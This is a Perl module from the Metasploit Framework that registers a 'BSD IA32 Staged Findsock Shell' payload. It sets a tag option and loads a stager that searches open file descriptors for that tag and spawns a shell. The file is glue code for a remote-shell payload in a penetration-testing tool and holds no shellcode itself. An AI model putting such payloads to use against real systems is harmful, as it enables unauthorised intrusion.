
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsd_ia32_findrecv_stg;
use strict;
use base 'Msf::PayloadComponent::BSD::ia32::ShellStage';

my $advanced =
{
	'FINDTAG'     => [ 'msf!', 'Tag sent and searched for by the payload.' ],
};

my $info =
{
	'Name'        => 'BSD IA32 Staged Findsock Shell',
	'Version'     => '$Revision$',
	'Description' => 'Search file descriptors for a tag and spawn a shell as a stage',
};

sub _Load
{
	Msf::PayloadComponent::BSD::ia32::ShellStage->_Import('Msf::PayloadComponent::BSD::ia32::FindRecvStager');

	__PACKAGE__->SUPER::_Load();
}

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };

	_Load();

	$hash = $class->MergeHashRec($hash, { 'Info' => $info, 'Advanced' => $advanced });

	my $self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
